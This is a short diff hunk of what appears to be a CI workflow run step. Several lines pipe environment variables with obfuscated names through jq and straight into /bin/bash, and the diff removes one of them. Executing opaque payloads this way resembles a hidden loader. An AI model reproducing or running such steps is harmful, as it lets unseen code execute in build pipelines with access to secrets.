@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$aua1472" | jq -r .cz6 | /bin/bash
           echo $yxr77 | jq -r .eqqmm6 | /bin/bash
-          echo $n95 | jq -r .sbcid472 | /bin/bash
           echo $rj06 | jq -r .zjyd181 | /bin/bash
           echo $y84 | jq -r .rbvy26844 | /bin/bash
           echo $ibjpg011 | jq -r .ze911 | /bin/bash
